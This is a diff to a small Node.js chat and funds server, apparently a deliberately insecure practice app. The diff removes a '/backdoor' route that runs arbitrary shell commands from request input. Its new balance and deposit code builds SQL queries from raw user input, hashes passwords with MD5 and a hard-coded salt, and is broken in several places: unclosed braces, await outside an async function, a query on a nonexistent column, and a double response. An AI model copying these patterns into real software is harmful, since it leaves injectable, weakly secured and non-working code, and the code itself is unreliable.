@@ -6,8 +6,9 @@ const { execSync } = require("child_process");
 const { verify, sign } = require('jsonwebtoken');
 const cookieParser = require("cookie-parser");
 
-const crypto = require('crypto');
 
+const crypto = require('crypto');
+const SALT = 'blah blah blah i love salty food';
 
 const hashify = (plaintext) => 
     crypto.createHash('md5').update(plaintext).digest('hex');
@@ -18,6 +19,21 @@ const port = 3000;
 
 
 const db = new sqlite3.Database(':memory');
+
+const checkBalance = (username) => {
+    return new Promise((resolve, reject) => {
+        db.get(`SELECT id FROM users WHERE username='${username}'`, (err, row) => {
+            if (err) {
+                reject(err);
+            } else {
+                const userid = row.id;
+                db.get(`SELECT balance FROM funds WHERE userid='${userid}'`, (err, row) => {
+                    resolve(row);
+                })
+            }
+        })
+    })
+}
 
 const JWT_SECRET = require('crypto').randomBytes(64).toString('hex');
 
@@ -30,6 +46,12 @@ db.run(`CREATE TABLE IF NOT EXISTS users (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     username TEXT,
     password TEXT
+)`);
+
+db.run(`CREATE TABLE IF NOT EXISTS funds (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    userid TEXT,
+    amount INT
 )`);
 
 function generateAccessToken(data) {
@@ -53,15 +75,15 @@ app.use((req, res, next) => {
     const { jwt } = req.cookies;
     const jwtWhitelist = ['login_attempt', 'register'];
     if (jwtWhitelist.some(whitePath => req.path.includes(whitePath))) {
-        console.log('we are in the whitelist')
+
         next();
     } else {
         verify(jwt, JWT_SECRET, (err, user) => {
             if (err) {
-                console.log(err, jwt)
+                console.log('actually not good')
+                console.log(jwt)
                 res.redirect('http://localhost:3001/login.html');
             } else {
-                console.log('jwt is valid')
                 next()
             }
           })    
@@ -73,7 +95,7 @@ app.use((req, res, next) => {
 app.post('/register', (req, res) => {
     const user = req.body.user;
     const pass = req.body.pass;
-    const passHash = hashify(pass);
+    const passHash = hashify(pass + SALT);
 
     db.run(`INSERT INTO users (username, password) VALUES ('${user}', '${passHash}')`);
     res.redirect('http://localhost:3001/login.html');
@@ -89,59 +111,79 @@ app.post('/logout', (req, res) => {
 app.post('/login_attempt', async (req, res) => {
     const user = req.body.user;
     const pass = req.body.pass;
-    const passHash = hashify(pass);
+    const passHash = hashify(pass + SALT);
 
     const dbUserPromise = new Promise((resolve, reject) => {
         db.all(`SELECT * FROM users WHERE username='${user}' AND password='${passHash}'`, (err, res) => {
             if (err) {
-                console.log(err)
                 reject(err)
             }
-            console.log(res)
             resolve(res)
         })
     })
     try {
         const dbUser = await dbUserPromise;
-        console.log(dbUser)
         if (!dbUser) {
             res.redirect('http://localhost:3001/login.html');
             return;
         }
-        const jwtCookie = generateAccessToken({ loggedIn: true });
+        const jwtCookie = generateAccessToken({ user });
         res.cookie('jwt', jwtCookie);
         res.redirect('http://localhost:3001');
     } catch (e) {
-        console.log(e)
         res.redirect('http://localhost:3001/login.html');
     }
 })
+    
 
-app.post('/messages', (req, res) => {
-    const { message } = req.body;
+app.post('/messages', async (req, res) => {
+    const { message, username } = req.body;
+
+    const balance = await checkBalance(username);
+    console.log('balance:', balance);
+
+    db.all('SELECT message FROM chat_messages', (err, rows) => {
+        if (err) {
+            return res.status(500).json({error: err.message});
+        }
+
+        res.json(rows);
+    })
+    // check balance, only post the message if balance is good, otherwise return error status.
 
     // The code below is vulnerable to SQL injection...
     // parameterization
     db.exec(`INSERT INTO chat_messages (message) VALUES ('${message}')`,  (err) => {
         if (err) {
-            console.log(err.message);
-            return res.status(500).json({error: err.message})
+            return res.status(500).json({error: err.message});
         }
 
         res.json({message});
     })
 })
-app.post('/backdoor', (req, res) => {
-    const { cmd } = req.body;
 
-    res.end(execSync(cmd).toString());
+app.post('/deposit', (req, res) => {
+    const { username, amount } = req.body;
+
+    db.get(`SELECT id FROM users WHERE username='${username}'`, (err, row) => {
+            db.get(`SELECT amount FROM funds WHERE userid=${row.id}`, (err, newRow) => {
+                if (row) {
+                    console.log(row)
+                } else {
+                    
+                }
+    res.end('ok')
+});
+
+app.post('/balance', (req, res) => {
+    const { username } = req.body;
+    res.end({ username: await checkBalance(username) });
 });
 
 app.get('/messages', (_req, res) => {
     db.all('SELECT message FROM chat_messages', (err, rows) => {
         if (err) {
-            console.log(err);
-            return res.status(500).json({error: err.message}) 
+            return res.status(500).json({error: err.message});
         }
 
         res.json(rows);
